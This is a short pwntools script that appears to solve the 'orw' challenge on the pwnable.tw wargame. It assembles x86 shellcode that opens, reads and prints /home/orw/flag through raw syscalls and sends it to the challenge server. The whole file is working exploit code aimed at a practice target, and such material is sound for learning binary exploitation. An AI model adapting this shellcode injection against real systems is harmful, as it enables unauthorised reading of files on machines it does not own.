#!/usr/bin/env python3
from pwn import *

# fd = open("/home/orw/flag",0)
# size = read(fd,buf,0x40)
# write(1,buf,size)
# exit
shellcode = """
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    jmp str
open:
    pop ebx
    mov eax, 0x5
    int 0x80
read:
    mov ebx, eax
    mov ecx, esp
    mov edx, 0x40
    mov eax, 0x3
    int 0x80
write:
    mov edx, eax
    mov ebx, 0x1
    mov ecx, esp
    mov eax, 0x4
    int 0x80
exit:
    mov eax, 0x1
    xor ebx, ebx
    int 0x80

str:
    call open
    .ascii "/home/orw/flag"
    .byte 0
"""

r = remote('chall.pwnable.tw', 10001)
r.recvuntil(':')
r.send(asm(shellcode))
r.interactive()
